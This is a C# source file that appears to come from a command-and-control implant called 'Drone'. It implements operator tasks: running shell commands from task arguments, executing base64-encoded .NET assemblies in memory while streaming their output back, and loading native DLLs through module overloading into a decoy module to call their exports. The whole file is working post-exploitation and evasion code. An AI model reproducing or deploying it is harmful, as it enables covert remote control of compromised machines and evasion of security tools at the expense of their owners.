using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;
using Drone.Invocation.DynamicInvoke;
using Drone.SharpSploit.Execution;

using StandardModule.Invocation.ManualMap;

namespace StandardModule;

public partial class StandardApi
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
    private delegate string GenericDelegate(string input);

    private void ExecuteShellCommand(DroneTask task, CancellationToken token)
    {
        var command = string.Join("", task.Arguments);
        var result = Shell.ExecuteShellCommand(command);

        Drone.SendResult(task.TaskGuid, result);
    }

    private void ExecuteRunCommand(DroneTask task, CancellationToken token)
    {
        var command = task.Arguments[0];
        var args = "";

        if (task.Arguments.Length > 1)
            args = string.Join("", task.Arguments.Skip(1));

        var result = Shell.ExecuteRunCommand(command, args);
        Drone.SendResult(task.TaskGuid, result);
    }

    private void ExecuteAssembly(DroneTask task, CancellationToken token)
    {
        var bytes = Convert.FromBase64String(task.Artefact);
        var ms = new MemoryStream();

        // run this in a task
        var t = Task.Run(() => { Assembly.AssemblyExecute(ms, bytes, task.Arguments); }, token);

        // while task is running, read from stream
        while (!t.IsCompleted && !token.IsCancellationRequested)
        {
            var output = ms.ToArray();
            ms.SetLength(0);

            var update = new DroneTaskUpdate(task.TaskGuid, DroneTaskUpdate.TaskStatus.Running, output);
            Drone.SendDroneTaskUpdate(update);

            Thread.Sleep(1000);
        }

        // get anything left
        var final = Encoding.UTF8.GetString(ms.ToArray());
        ms.Dispose();
        Drone.SendResult(task.TaskGuid, final);
    }

    private void OverloadNativeDll(DroneTask task, CancellationToken token)
    {
        var dll = Convert.FromBase64String(task.Artefact);
        var decoy = Overload.FindDecoyModule(dll.Length);

        if (string.IsNullOrEmpty(decoy))
        {
            Drone.SendError(task.TaskGuid, "Unable to find a suitable decoy module ");
            return;
        }

        var map = Overload.OverloadModule(dll, decoy);
        var export = task.Arguments[0];

        object[] funcParams = { };

        if (task.Arguments.Length > 1)
            funcParams = new object[] { string.Join(" ", task.Arguments.Skip(1)) };

        var result = (string)Generic.CallMappedDllModuleExport(
            map.PEINFO,
            map.ModuleBase,
            export,
            typeof(GenericDelegate),
            funcParams);

        Drone.SendResult(task.TaskGuid, result);

        Map.FreeModule(map);
    }
}